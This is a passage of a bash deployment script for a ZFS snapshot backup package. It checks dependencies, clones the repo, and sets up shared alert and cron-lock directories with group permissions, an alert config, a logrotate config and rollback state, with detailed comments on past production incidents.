    if [ "$any" -eq 0 ]; then
        warn "nothing paused -- no saved --fullcron state and no paused blocks found"
        return 1
    fi
    return "$rc"
}
# END --pause/--resume family -- test/pause/run.sh extracts everything from
# PAUSE_STATE_DIR down to this line and evals it. It used to end the extraction
# at `# do_revoke_old` instead, which worked only because that comment happened
# to sit immediately below; moving this family above the phases (2026-08-20)
# turned that adjacency into half the file. An explicit terminator says what
# was previously only true by accident.

# The dispatch sits HERE, above every phase, and not with the other sub-mode
# dispatches further down. Until 2026-08-20 it lived below them, so `--pause`
# and `--resume` ran the whole deployment first: nine phases, measured on a
# real run. Two of those phases WRITE cron lines, and lib-cron.sh correctly
# refuses to write into a paused block -- so `--resume` announced
#     could not install the auto-update cron line: ... this host would stop
#     picking up updates
# eight lines before resuming perfectly well. The guard was right and the
# alarm was false, which is the combination that teaches an operator to skim
# past '!!!'.
#
# A maintenance window is a crontab operation. It has no business pulling the
# repo, rewriting notify-fail.sh or reinstalling cron lines, so it now runs
# after argument validation and before anything that touches the host.
# Everything above this point is validation, constants and function
# definitions; nothing above mutates the machine.
if [ "$PAUSE_MODE" -eq 1 ]; then
    do_pause
    exit $?
fi
if [ "$RESUME_MODE" -eq 1 ]; then
    do_resume
    exit $?
fi

# SAME RULE, and the reviewer's F4 decision of 2026-08-26: committing a scope is
# a decision about PERMISSIONS. It has no business pulling the repo, rewriting
# notify-fail.sh or installing cron lines -- and until this moved it did all
# three, because the dispatch sat after Phase 7, near the foot of the file.
#
# Measured that day: `deploy.sh --commit-scope=pve9`, run on a PRODUCTION host to
# answer a permission question, added `0 8 * * * check-pool-capacity.sh` to
# root's crontab. The line is harmless; an operator being surprised by it is not.
#
# Safe this early because do_commit_scope depends on nothing the phases build:
# it calls do_commit_scope_check (which reads the manifest and the scope file),
# then `zfs allow`. It needs root and zfs, and both are properties of the host,
# not of this script's provisioning.
#
# NOT changed here, and worth a separate decision: --draft-scope and --leave sit
# at that same late dispatch and have the same shape -- a scope decision and a
# teardown, neither of which provisions anything. --join is different: enrolling
# a host legitimately sets it up.
if [ "$COMMIT_SCOPE_MODE" -eq 1 ]; then
    do_commit_scope "$COMMIT_SCOPE_LABEL"
    exit 0
fi

# ------------------------------------------------------------------------------
log "Phase 1: dependencies"
# ------------------------------------------------------------------------------
# The list below is derived from what the package's scripts ACTUALLY invoke, not
# from memory -- re-derive it with:
#   grep -ohE '\b(zfs|mbuffer|pigz|zstd|ssh|flock|mail|hostname|md5sum)\b' *.sh | sort -u
# and keep this table in step. Severity decides what a miss costs:
#
#   required     -- the package cannot work at all; missing => FATAL
#   compression  -- only jobs using -z/-Z/-g need it, but -z is on almost every
#                   real cron line, so treat a miss as loud
#   optional     -- degrades a feature, not the core; missing => warning
#
MISSING_OPTIONAL=""

# check_dep <command> <apt-package> <severity> <why>
check_dep() {
    local cmd="$1" pkg="$2" sev="$3" why="$4"

    if command -v "$cmd" >/dev/null 2>&1; then
        log "  [ok]      $cmd ($why)"
        return 0
    fi

    if [ "$CHECK_ONLY" -eq 1 ]; then
        case "$sev" in
            required) warn "  [MISSING] $cmd (apt: $pkg) -- REQUIRED: $why" ;;
            *)        warn "  [missing] $cmd (apt: $pkg) -- $why" ;;
        esac
        MISSING_OPTIONAL="$MISSING_OPTIONAL $cmd"
        return 1
    fi

    log "  [missing]  $cmd -- installing '$pkg' ($why)"
    apt_install_with_fallback "$pkg" >/dev/null 2>&1 || true

    if command -v "$cmd" >/dev/null 2>&1; then
        log "  [installed] $cmd"
        return 0
    fi

    case "$sev" in
        required)
            die "$cmd is REQUIRED and could not be installed from '$pkg' -- $why"
            ;;
        compression)
            warn "$cmd could not be installed from '$pkg' -- $why"
            MISSING_OPTIONAL="$MISSING_OPTIONAL $cmd"
            ;;
        *)
            warn "$cmd not available ('$pkg') -- $why"
            MISSING_OPTIONAL="$MISSING_OPTIONAL $cmd"
            ;;
    esac
    return 1
}

check_dep git      git              required    "cloning and auto-updating this repo"
# Found live 2026-08-17 on a fresh Debian genericcloud VM: the image ships with
# NO cron at all, this table said "all dependencies present", and activation
# then died mid-flight on "could not read the live crontab". Everything this
# package orchestrates runs FROM cron -- its absence is as fatal as a missing
# zfs, it just fails later and more confusingly.
check_dep crontab  cron             required    "every generated job runs from cron; minimal/cloud images ship without it"
check_dep flock    util-linux       required    "single-instance locking in all send/prune scripts"
check_dep mbuffer  mbuffer          required    "snapsend.sh/snapget.sh refuse to start without it, even without -z"
check_dep hostname hostname         required    "validate_remote_host uses 'hostname -f' to refuse loopback replication"
check_dep md5sum   coreutils        required    "per-target bookmark tags (lib-zfs-snap.sh)"
check_dep awk      gawk             required    "snapshot list parsing"

# zstd is the DEFAULT compressor since 2026-07-22 -- it measured better than pigz
# on BOTH ratio and throughput (see the benchmark table in snapsend.sh's header).
# So on a fresh host a missing zstd breaks every ordinary '-z' cron line, which
# is why it is checked BEFORE pigz and treated as loud.
check_dep zstd     zstd             compression "DEFAULT compressor for -z/-Z"
check_dep pigz     pigz             compression "alternative compressor, selected with -g"

check_dep ssh      openssh-client   optional    "remote push/pull; local-only hosts do not need it"
check_dep mail     mailutils        optional    "notify-fail.sh / capacity + staleness alerting"

# ------------------------------------------------------------------------------
log "Part 1b: ZFS itself"
# ------------------------------------------------------------------------------
# Deliberately separate from the table: on a host without ZFS this is not a
# missing utility, it is the wrong host. Installing zfsutils-linux would give a
# working CLI with no pool support, which fails later and much less clearly.
if ! command -v zfs >/dev/null 2>&1 && [ "$CHECK_ONLY" -eq 0 ]; then
    warn "zfs command not found -- attempting zfsutils-linux (expected already present on Proxmox)"
    apt_install_with_fallback zfsutils-linux >/dev/null 2>&1 || true
fi
command -v zfs >/dev/null 2>&1 || die "zfs not available -- this package manages ZFS snapshots and cannot do anything on this host"

# A CLI that cannot reach the kernel module is the failure that actually bites:
# every script would run and report nothing rather than failing loudly.
if ! zfs list -H >/dev/null 2>&1; then
    die "the 'zfs' command exists but 'zfs list' fails -- kernel module not loaded, or no pools imported. Fix that before deploying backups here."
fi
log "  [ok]      zfs $(zfs version 2>/dev/null | head -1 | awk '{print $NF}') -- $(zpool list -H -o name 2>/dev/null | tr '\n' ' ')"

# ------------------------------------------------------------------------------
log "Phase 2: deploy the repo into $REPO_DIR"
# ------------------------------------------------------------------------------
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -d "$REPO_DIR/.git" ]; then
        log "checkout present at $REPO_DIR ($(git -C "$REPO_DIR" rev-parse --short HEAD 2>/dev/null))"
        d=$(git -C "$REPO_DIR" status --porcelain 2>/dev/null)
        [ -n "$d" ] && warn "checkout has local modifications -- 'git pull --ff-only' will fail:
$d"
    else
        warn "no git checkout at $REPO_DIR -- run without --check-only to create it"
    fi
else

mkdir -p "$(dirname "$REPO_DIR")"

if [ -d "$REPO_DIR/.git" ]; then
    log "$REPO_DIR is already a git repo, pulling..."
    git -C "$REPO_DIR" remote get-url origin 2>/dev/null | grep -qF "$REPO_URL" \
        || warn "existing repo's origin does not match $REPO_URL -- check manually"
    git -C "$REPO_DIR" pull --ff-only origin main \
        || die "git pull --ff-only failed -- local repo has diverged, resolve manually before continuing"

elif [ -d "$REPO_DIR" ] && [ -n "$(ls -A "$REPO_DIR" 2>/dev/null)" ]; then
    log "$REPO_DIR exists with files but is not a git repo (plain scripts from an earlier manual copy?)"
    log "Backing up any of the 3 tracked scripts that would collide with the checkout..."
    BACKUP_DIR="${REPO_DIR}.bak-preGit-$(date +%Y%m%d%H%M%S)"
    mkdir -p "$BACKUP_DIR"
    for f in snapsend.sh snapget.sh delsnaps.sh; do
        if [ -e "$REPO_DIR/$f" ]; then
            mv "$REPO_DIR/$f" "$BACKUP_DIR/"
            log "  moved $f -> $BACKUP_DIR/"
        fi
    done

    ( cd "$REPO_DIR" \
      && git init \
      && git remote add origin "$REPO_URL" \
      && git fetch origin \
      && git checkout -b main --track origin/main ) \
      || die "git init/checkout failed"

    log "Diff against backup (should be empty besides new .git/.gitignore/.gitattributes):"
    diff -rq "$BACKUP_DIR" "$REPO_DIR" 2>&1 | grep -v "^Only in $REPO_DIR:" || true

else
    log "$REPO_DIR does not exist or is empty -- plain clone"
    git clone "$REPO_URL" "$REPO_DIR" || die "git clone failed"
fi

fi   # end of CHECK_ONLY guard for Part 2

# ------------------------------------------------------------------------------
log "Phase 2a: host settings ($SETTINGS_FILE)"
# ------------------------------------------------------------------------------
# settings_get (lib-cron.sh) has read this file since 2026-08-26 and no host had
# one, so its two keys existed only in the code looking for them. Owner
# direction, 2026-08-27: the file must exist and must document what a failed
# freeze now does.
#
# Written ONCE. Every line in it is commented, so a fresh file changes nothing
# about how this host behaves -- it is there to be edited. Never overwritten,
# because this runs from every deploy and an edited file is the point.
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -r "$SETTINGS_FILE" ]; then
        log "settings present: $SETTINGS_FILE"
    else
        warn "no $SETTINGS_FILE -- run without --check-only to write the documented default"
    fi
elif settings_write_default "$SETTINGS_FILE"; then
    log "wrote $SETTINGS_FILE (all keys commented -- built-in defaults in force)"
else
    if [ -e "$SETTINGS_FILE" ]; then
        log "$SETTINGS_FILE already exists -- left exactly as it is"
        # An unreadable settings file does not fail; settings_get falls back to
        # the built-in default silently, which is the one failure mode of this
        # file worth a warning.
        [ -r "$SETTINGS_FILE" ] || warn "$SETTINGS_FILE is not readable -- the delegated account will silently get built-in defaults instead of what it says"
    else
        warn "could not write $SETTINGS_FILE -- built-in defaults stay in force"
    fi
fi

# ------------------------------------------------------------------------------
log "Phase 6: verify the deployment"
# ------------------------------------------------------------------------------
cd "$REPO_DIR" || die "cannot cd into $REPO_DIR"
log "HEAD: $(git log -1 --oneline)"

FAIL=0

# lib-zfs-snap.sh is not optional: snapsend/snapget/delsnaps/gen-cron all source
# it and exit immediately if it is missing. Check it FIRST, because without it
# every -V below would fail and the real cause would be buried in the noise.
if [ ! -r lib-zfs-snap.sh ]; then
    die "lib-zfs-snap.sh missing from the checkout -- snapsend/snapget/delsnaps/gen-cron all source it and refuse to start. The clone is incomplete."
fi
log "  lib-zfs-snap.sh present"

# All five executables the package ships, not just the original three: gen-cron.sh
# (crontab generator) and check-snap-age.sh (staleness monitor) are part of the
# package now and are just as easy to get wrong silently.
for f in snapsend.sh snapget.sh delsnaps.sh gen-cron.sh check-snap-age.sh; do
    if [ ! -e "$f" ]; then
        warn "$f is missing from the checkout"
        FAIL=1
        continue
    fi
    if [ ! -x "$f" ]; then
        warn "$f is not executable (fixing with chmod +x)"
        chmod +x "$f"
    fi
    # Syntax check before execution: a truncated or CRLF-mangled file can still
    # be executable, and the failure it produces later is far less obvious.
    bash -n "$f" 2>/dev/null || { warn "$f fails 'bash -n' -- corrupt or wrong line endings?"; FAIL=1; continue; }
    v=$(./"$f" -V 2>&1) || { warn "$f -V failed: $v"; FAIL=1; continue; }
    log "  $f -> $v"
done
[ "$FAIL" -eq 0 ] || warn "one or more scripts failed the smoke test -- investigate before relying on cron"

# Prove the compressor actually round-trips ON THIS HOST rather than trusting
# that the binary being present means it works. Cheap, and catches a broken or
# shimmed install before a real transfer does.
for c in zstd pigz; do
    command -v "$c" >/dev/null 2>&1 || continue
    case "$c" in
        zstd) probe="zstd -T0 -3 -c" ; unprobe="zstd -d -c" ;;
        pigz) probe="pigz -6"        ; unprobe="pigz -d"    ;;
    esac
    if [ "$(echo zfs-snapshot-all | $probe | $unprobe 2>/dev/null)" = "zfs-snapshot-all" ]; then
        log "  $c round-trip ok"
    else
        warn "$c is installed but failed a compress/decompress round-trip -- jobs using it will break"
        FAIL=1
    fi
done

# ------------------------------------------------------------------------------
log "Phase 4: notify-fail.sh (alert reporting)"
# ------------------------------------------------------------------------------
# Shared alerting state, deliberately OUTSIDE /root. /root is 0700, so a
# delegated non-root service account (phase 8) cannot reach
# anything under it -- not the queue, not the config, not the notify scripts.
# The tempting shortcut, opening /root/scripts to a group, is a privilege
# escalation: that directory holds scripts root executes from cron, so a
# service account able to write there could replace them. Hence a separate
# group-writable directory that contains only data.
ALERT_GROUP="zfsalert"
# DEFINED HERE, at top level, deliberately -- not inside the branch below.
#
# These two used to sit inside the `if CHECK_ONLY` arm, while
# cron_lock_files_repair is called from the `else` arm. So on every REAL
# deployment run the definition never executed and the call died with
# "command not found", printed into the middle of a long deploy log and
# carried on. Found 2026-08-20 by running deploy.sh --join for real on
# metropolis pve2. No suite could catch it: the suites extract functions with
# sed, so the definition is always present for them.
#
# What it cost: the repair below is what fixes a 0644 lock file locking a
# delegated account out of its own crontab -- measured on THREE OF FOUR
# production hosts on 2026-08-07 -- and it had not run once since.
# A lock file is a SHARED object in a setgid directory: the directory makes it
# inherit the group, but the MODE comes from whoever creates it first -- and
# root usually does (deploy and activate-client take the ACCOUNT's lock as
# root). A 0644 file then locks the delegated account out of its own crontab
# permanently, not once. Measured 2026-08-07: three of four production hosts
# were in exactly that state and `gen-cron.sh --install` as the account failed
# on each.
#
# lib-cron.sh cannot fix this itself -- it runs as the unprivileged account and
# may not chmod a root-owned file. deploy.sh runs as root, so it is the
# component whose job this is. Identical treatment to alert-queue.log, for the
# identical reason.
#
# Nothing is created on spec here; locks appear when something takes one. This
# only repairs what already exists, and is cheap enough to run every time.
cron_lock_files_repair() {   # <lock dir> <group>
    local dir="$1" grp="$2" lk
    [ -d "$dir" ] || return 0
    for lk in "$dir"/*.lock; do
        [ -f "$lk" ] || continue
        chgrp "$grp" "$lk" 2>/dev/null
        chmod 0664 "$lk" 2>/dev/null
    done
}

# The DIRECTORY being right says nothing about the files in it, and the files
# are what actually refuse a write. An audit that checked the container and not
# its contents passed three of four production hosts that could not install a
# crontab at all.
#
# The GROUP digit is the one second from the right -- read positionally, not by
# a fixed-width pattern, because a mode may print as 644 or 2664. Write is set
# in 2,3,6,7. REV-20260806-050 caught this exact confusion (owner digit vs
# group digit) once already.
cron_lock_files_audit() {   # <lock dir> <expected group>  -> 0 all usable, 1 not
    local dir="$1" grp="$2" lk m g og bad_grp="" bad_mode=""
    [ -d "$dir" ] || return 0
    for lk in "$dir"/*.lock; do
        [ -f "$lk" ] || continue
        # BOTH properties, because either one alone is worthless: a 0664 file
        # owned by group root is group-writable to a group the delegated
        # account is not in, and a file in the right group with 0644 is in a
        # group that cannot write it. The production invariant is shared group
        # AND group-write -- REV-20260807-062 caught this audit asserting only
        # the second half of what its own repair function guarantees.
        og="$(stat -c '%G' "$lk" 2>/dev/null)"
        [ "$og" = "$grp" ] || bad_grp="$bad_grp $(basename "$lk")(group=$og)"
        m="$(stat -c '%a' "$lk" 2>/dev/null)"
        g="${m%?}"; g="${g: -1}"
        case "$g" in
            2|3|6|7) ;;
            *) bad_mode="$bad_mode $(basename "$lk")($m)" ;;
        esac
    done
    [ -n "$bad_grp$bad_mode" ] || return 0
    # Named separately: "wrong group" and "not group-writable" have different
    # causes and the operator reads this to decide whether something else is
    # also misconfigured.
    [ -n "$bad_grp" ] && warn "  lock files in the WRONG GROUP (expected $grp):$bad_grp -- the delegated account is not in that group, so it cannot open them whatever the mode says."
    [ -n "$bad_mode" ] && warn "  lock files NOT group-writable:$bad_mode -- whichever identity did not create them cannot write that crontab at all."
    warn "  a normal (non --check-only) deploy.sh run repairs this."
    return 1
}

if [ "$CHECK_ONLY" -eq 1 ]; then
    getent group "$ALERT_GROUP" >/dev/null || warn "  group $ALERT_GROUP missing -- a delegated account could not queue alerts"

    if [ -d "$ALERT_SHARED_DIR" ]; then
        log "  $ALERT_SHARED_DIR present ($(stat -c '%a %U:%G' "$ALERT_SHARED_DIR"))"
    else
        warn "  $ALERT_SHARED_DIR missing -- alert queue would fall back to a root-only path"
    fi
    # REV-20260803-035: lib-cron.sh's lock directory needs the identical
    # treatment and for the identical reason -- root and the delegated account
    # both write managed crontabs, and a lock only two identities can each
    # reach is not a lock.
    if [ -d "$CRON_LOCK_DIR" ]; then
        log "  $CRON_LOCK_DIR present ($(stat -c '%a %U:%G' "$CRON_LOCK_DIR"))"
        cron_lock_files_audit "$CRON_LOCK_DIR" "$ALERT_GROUP"
    else
        warn "  $CRON_LOCK_DIR missing -- lib-cron.sh would refuse every crontab write until this is created"
    fi
else
    getent group "$ALERT_GROUP" >/dev/null || { groupadd --system "$ALERT_GROUP" && log "created group $ALERT_GROUP"; }
    mkdir -p "$ALERT_SHARED_DIR/notify-state"
    alert_dir_chgrp "$ALERT_SHARED_DIR" "$ALERT_GROUP" "$PAIR_GATE_STATE_DIR"
    # 2775: setgid, so every file created here inherits the group and stays
    # writable by the other account no matter which one created it.
    chmod 2775 "$ALERT_SHARED_DIR" "$ALERT_SHARED_DIR/notify-state"
    log "shared alert dir $ALERT_SHARED_DIR (2775 root:$ALERT_GROUP)"

    # REV-20260803-035: one fixed, persistent, root:zfsalert lock directory --
    # NOT /run (tmpfs, and a writability-based fallback is exactly the bug
    # this replaces). Root and the delegated account (added to $ALERT_GROUP
    # by Phase 8 below) both resolve and can write to this exact path, so a
    # lock keyed by target user is finally a lock shared by whoever might
    # write that user's crontab, not one namespace per caller.
    mkdir -p "$CRON_LOCK_DIR"
    chgrp "$ALERT_GROUP" "$CRON_LOCK_DIR"
    chmod 2775 "$CRON_LOCK_DIR"
    log "shared cron lock dir $CRON_LOCK_DIR (2775 root:$ALERT_GROUP)"
    cron_lock_files_repair "$CRON_LOCK_DIR" "$ALERT_GROUP"
fi

# ------------------------------------------------------------------------------
log "Phase 4b: update-control state (rollback bookkeeping, root-private)"
# ------------------------------------------------------------------------------
# Deliberately NOT inside $ALERT_SHARED_DIR (REV-20260729-004 F1): that
# directory is 2775 root:$ALERT_GROUP on purpose so the delegated account above
# can queue alert data, and group-write on the directory would also let it
# remove or replace previous-revision/update-hold -- undoing an administrator's
# rollback. This lives under /root instead, for the same reason notify-fail's
# own scripts do (see the note at the top of Phase 4).
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -L "$UPDATE_STATE_DIR" ]; then
        warn "  $UPDATE_STATE_DIR is a symlink -- --self-update/--rollback/--resume-updates would all refuse to run"
    elif [ -d "$UPDATE_STATE_DIR" ]; then
        _mode=$(stat -c '%a' "$UPDATE_STATE_DIR" 2>/dev/null)
        log "  $UPDATE_STATE_DIR present ($(stat -c '%a %U:%G' "$UPDATE_STATE_DIR" 2>/dev/null))"
        if [ -n "$_mode" ] && [ $(( 0${_mode} & 0022 )) -ne 0 ]; then
            warn "  $UPDATE_STATE_DIR is group- or world-writable (mode $_mode) -- a delegated account could tamper with rollback state"
        fi
    else
        log "  $UPDATE_STATE_DIR not created yet -- the first --self-update/--rollback creates it 0700 root:root"
    fi
else
    # One-time migration: earlier deploys defaulted this to $ALERT_SHARED_DIR
    # (F1). A host that already recorded a rollback point, or worse is
    # currently HELD after a real --rollback, must not silently lose that just
    # because this fix moved the default elsewhere -- that would either strand
    # an operator's hold-removal instructions or (for previous-revision) quietly
    # discard a working rollback point with no warning.
    if [ "$ALERT_SHARED_DIR" != "$UPDATE_STATE_DIR" ]; then
        for _f in previous-revision update-hold; do
            _old="$ALERT_SHARED_DIR/$_f"
            _new="$UPDATE_STATE_DIR/$_f"
            if [ -f "$_old" ] && [ ! -L "$_old" ] && [ ! -e "$_new" ]; then
                if ensure_update_state_dir && mv -n "$_old" "$_new" 2>/dev/null; then
                    log "migrated $_old -> $_new (REV-20260729-004 F1: update-control state is no longer inside the group-writable alert dir)"
                else
                    warn "could not migrate $_old to $_new -- check by hand, a rollback point or hold may be stranded"
                fi
            fi
        done
    fi
    ensure_update_state_dir         && log "update-control state dir $UPDATE_STATE_DIR ($(stat -c '%a %U:%G' "$UPDATE_STATE_DIR" 2>/dev/null))"         || warn "  could not prepare $UPDATE_STATE_DIR as a safe, root-private directory -- --self-update/--rollback/--resume-updates will all refuse to run until this is fixed by hand"
fi

ALERT_CONF="/etc/zfs-alert.conf"
OLD_ALERT_CONF="/root/scripts/zfs-alert.conf"
OLD_QUEUE="/root/scripts/alert-queue.log"
if [ "$CHECK_ONLY" -eq 0 ]; then
    # Migrate a host that was set up before the split. Move, don't copy: two
    # readable configs would be two sources of truth, and the scripts prefer
    # /etc, so a stale /root copy would silently do nothing while looking live.
    if [ -f "$OLD_ALERT_CONF" ] && [ ! -f "$ALERT_CONF" ]; then
        sed -e "s#^ZFS_ALERT_QUEUE=.*#ZFS_ALERT_QUEUE=$ALERT_SHARED_DIR/alert-queue.log#" \
            -e "s#^ZFS_ALERT_STATE_DIR=.*#ZFS_ALERT_STATE_DIR=$ALERT_SHARED_DIR/notify-state#" \
            "$OLD_ALERT_CONF" > "$ALERT_CONF" && rm -f "$OLD_ALERT_CONF"
        chmod 0644 "$ALERT_CONF"
        log "migrated $OLD_ALERT_CONF -> $ALERT_CONF (queue/state repointed at $ALERT_SHARED_DIR)"
    fi
    # Anything already queued must ride along, or the next digest reports a
    # quiet day that was not quiet.
    if [ -s "$OLD_QUEUE" ]; then
        cat "$OLD_QUEUE" >> "$ALERT_SHARED_DIR/alert-queue.log" && rm -f "$OLD_QUEUE"
        chgrp "$ALERT_GROUP" "$ALERT_SHARED_DIR/alert-queue.log" 2>/dev/null
        chmod 0664 "$ALERT_SHARED_DIR/alert-queue.log" 2>/dev/null
        log "migrated queued findings from $OLD_QUEUE"
    fi
    # An existing queue may predate the umask fix and be 0644, which locks out
    # whichever account did not happen to create it. Cheap to correct every run.
    if [ -f "$ALERT_SHARED_DIR/alert-queue.log" ]; then
        chgrp "$ALERT_GROUP" "$ALERT_SHARED_DIR/alert-queue.log" 2>/dev/null
        chmod 0664 "$ALERT_SHARED_DIR/alert-queue.log" 2>/dev/null
    fi
fi

if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -r "$ALERT_CONF" ]; then
        log "  $ALERT_CONF present (mode: $(sed -n 's/^ZFS_ALERT_MODE=\([a-z]*\).*/\1/p' "$ALERT_CONF" | head -1))"
    else
        warn "  $ALERT_CONF missing -- alerting falls back to built-in defaults (daily)"
    fi
elif [ -e "$ALERT_CONF" ]; then
    log "$ALERT_CONF exists -- NOT overwritten (it is yours to edit; current mode: $(sed -n 's/^ZFS_ALERT_MODE=\([a-z]*\).*/\1/p' "$ALERT_CONF" | head -1))"
else
    FIRST_TIME_SETUP=1
    cat > "$ALERT_CONF" <<EOF
# zfs-alert.conf -- how this host reports backup problems.
# Sourced by notify-fail.sh, notify-warn.sh and alert-digest.sh. Plain shell:
# VAR=value, no spaces around '='. Re-running deploy.sh never
# overwrites this file, so local changes survive an upgrade.
#
# ---------------------------------------------------------------------------
#  ZFS_ALERT_MODE   daily | immediate      <-- THE ONE TO CHANGE
# ---------------------------------------------------------------------------
#   daily      (default) findings are queued and alert-digest.sh sends exactly
#              ONE mail per host per day, covering alerts and warnings
#              together. A day with nothing to report sends no mail at all.
#              Chosen because at fleet scale a mail per finding is a stream the
#              operator starts filtering away.
#
#   immediate  every ALERT mails the moment it happens. SET THIS WHILE BRINGING
#              A HOST UP: a job you misconfigured today is a five-minute fix if
#              you hear about it within the hour, and a lost night of backups if
#              you read about it in tomorrow's digest. Switch back to daily once
#              the host has run clean for a few days.
#              Known cost, and the reason daily is the default: the rate limit
#              is per MESSAGE, so two different jobs failing in the same cron
#              tick send two separate mails at the same second.
#
# In immediate mode a finding is NOT also queued, so it is never reported twice.
ZFS_ALERT_MODE=${ALERT_MODE}

# Same choice for WARNING-tier findings ("getting stale", not yet critical).
# Leave on daily unless you have a specific reason: warnings are by definition
# the ones that are not urgent, and making them immediate is how an inbox that
# gets read turns into one that gets filtered.
ZFS_WARN_MODE=daily

# Where alerts go. Changing it here changes it for all three scripts at once.
ZFS_ALERT_EMAIL=${NOTIFY_EMAIL}

# Immediate mode only: seconds before the SAME message may mail again.
# Ignored entirely in daily mode (the digest de-duplicates by counting instead).
ZFS_ALERT_COOLDOWN=14400

# Immediate mode only: where the per-message cooldown timestamps live.
ZFS_ALERT_STATE_DIR=${ALERT_SHARED_DIR}/notify-state

# Queue file used by daily mode. The digest consumes it and deletes it; if mail
# delivery fails the findings are put back rather than dropped.
ZFS_ALERT_QUEUE=${ALERT_SHARED_DIR}/alert-queue.log

# When the daily mail goes out. This is the cron SCHEDULE, so it lives in the
# crontab, not here -- gen-cron.sh emits it (DIGEST_SCHEDULE, default 0 7 * * *).
EOF
    chmod 0644 "$ALERT_CONF"
    log "created $ALERT_CONF (ZFS_ALERT_MODE=$ALERT_MODE)"
fi

LOGROTATE_CONF="/etc/logrotate.d/zfs-snapshot-all"
LOGROTATE_MARKER="# zfs-snapshot-all logrotate v1"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -f "$LOGROTATE_CONF" ]; then log "  $LOGROTATE_CONF present"; else warn "  $LOGROTATE_CONF missing -- cron.log grows without bound"; fi
elif [ -e "$LOGROTATE_CONF" ] && grep -qF "$LOGROTATE_MARKER" "$LOGROTATE_CONF" 2>/dev/null; then
    log "$LOGROTATE_CONF already current, leaving it alone"
else
    # Measured before writing this: ~0.1 MB/day, i.e. 4-56 MB after 200-500 days,
    # and ZFS compresses that ~11x on disk. So rotation is for bounded worst case
    # and quick greps, NOT for space -- and retention stays LONG on purpose,
    # because diagnosing a backup problem means comparing runs weeks apart.
    #
    # The file list is explicit, never /root/scripts/*.log: alert-queue.log and
    # warn-queue.log live there too and are STATE, not logs. Rotating them would
    # move the queue out from under alert-digest.sh and silently discard every
    # finding waiting to be mailed.
    #
    # No copytruncate: each cron line opens its log fresh via 2>>, so a plain
    # rename is safe -- a job running across the rotation just finishes writing
    # into the .1 file. copytruncate would be strictly worse here, since it can
    # lose whatever is written during the copy window.
    cat > "$LOGROTATE_CONF" <<EOF
$LOGROTATE_MARKER -- managed by deploy.sh, re-run it to update.
# Deliberately NOT a *.log glob: the alert queue lives in the same directory and
# is state, not a log -- rotating it would throw away queued findings.
/root/scripts/cron.log
/root/scripts/git-pull.log
/root/scripts/zfs-snapshot-stats.log
{
    monthly
    rotate 24
    maxsize 50M
    compress
    delaycompress
    notifempty
    missingok
    create 0644 root root
}
EOF
    chmod 0644 "$LOGROTATE_CONF"
    log "created $LOGROTATE_CONF (monthly, keep 24, compressed)"
fi

if [ "$CHECK_ONLY" -eq 0 ] && command -v logrotate >/dev/null; then
    logrotate --debug "$LOGROTATE_CONF" >/dev/null 2>&1 \
        && log "  logrotate config parses cleanly" \
        || warn "  logrotate rejected $LOGROTATE_CONF -- check it by hand"
fi

# The alert scripts' shared config/env preamble, written ONCE.
#
# notify-fail.sh, notify-warn.sh and alert-digest.sh are three standalone
# scripts on the host -- they cannot source a common library, so the text below
# genuinely has to appear in all three. What does NOT have to happen is this
# file carrying three copies of it: until 2026-08-20 it did, and a fix to the
# env-precedence rule had to land in three places or the three generated
# scripts would disagree about which knob wins.
#
# Defined with an UNQUOTED heredoc on purpose. Every '$' in the body is
# escaped as '\$' because it is destined for the generated script, and an
# unquoted heredoc resolves that escaping HERE, at definition time, so the
# variable holds a literal '$'. Interpolating it into the three (also
# unquoted) heredocs below then inserts it verbatim -- parameter expansion is
# not recursive, so nothing in the body is expanded a second time.
#
# Verified before the change, not assumed: rendering the body directly and
# rendering it through this variable produce byte-identical output (28 lines,
# zero diff). A quoted heredoc here would NOT be equivalent -- it would keep
# the backslashes and emit '\${ZFS_ALERT_MODE:-}' into the generated script.
ALERT_ENV_PREAMBLE=$(cat <<EOF
# The ENVIRONMENT wins over the config file. Sourcing the config last looks
# harmless until you notice these are exactly the knobs a test sets: a run with
# ZFS_ALERT_QUEUE pointed at a scratch file silently used the PRODUCTION queue
# instead -- summarised it, mailed it and deleted it. Snapshot the env values
# before the config can overwrite them, then put them back.
_E_MODE="\${ZFS_ALERT_MODE:-}"; _E_WMODE="\${ZFS_WARN_MODE:-}"
_E_QUEUE="\${ZFS_ALERT_QUEUE:-}"; _E_EMAIL="\${ZFS_ALERT_EMAIL:-}"
_E_STATE="\${ZFS_ALERT_STATE_DIR:-}"
CONF="\${ZFS_ALERT_CONF:-}"
if [ -z "\$CONF" ]; then
    # /etc first: /root is 0700, so a delegated service account (see
    # phase 8) cannot read anything under it. The old in-/root
    # location stays as a fallback so an un-migrated host keeps working.
    for c in /etc/zfs-alert.conf /root/scripts/zfs-alert.conf; do
        [ -r "\$c" ] && { CONF="\$c"; break; }
    done
fi
# shellcheck disable=SC1090
[ -n "\$CONF" ] && . "\$CONF"
_restore_env() {
    [ -n "\$_E_MODE" ]  && ZFS_ALERT_MODE="\$_E_MODE"
    [ -n "\$_E_WMODE" ] && ZFS_WARN_MODE="\$_E_WMODE"
    [ -n "\$_E_QUEUE" ] && ZFS_ALERT_QUEUE="\$_E_QUEUE"
    [ -n "\$_E_EMAIL" ] && ZFS_ALERT_EMAIL="\$_E_EMAIL"
    [ -n "\$_E_STATE" ] && ZFS_ALERT_STATE_DIR="\$_E_STATE"
    return 0
}
_restore_env
EOF
)

NOTIFY_SCRIPT="/root/scripts/notify-fail.sh"
NOTIFY_SCRIPT_MARKER="# notify-fail.sh v9"   # bump this comment when the heredoc body below changes
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ ! -x "$NOTIFY_SCRIPT" ]; then
        warn "  $NOTIFY_SCRIPT missing -- job failures would be silent"
    elif grep -qF "$NOTIFY_SCRIPT_MARKER" "$NOTIFY_SCRIPT" 2>/dev/null; then
        log "  $NOTIFY_SCRIPT present (current)"
    else
        warn "  $NOTIFY_SCRIPT present but outdated (wrong queue path, or mails immediately) -- re-run without --check-only to upgrade"
    fi
elif [ -e "$NOTIFY_SCRIPT" ] && grep -qF "$NOTIFY_SCRIPT_MARKER" "$NOTIFY_SCRIPT" 2>/dev/null; then
    log "$NOTIFY_SCRIPT already current, leaving it alone"
else
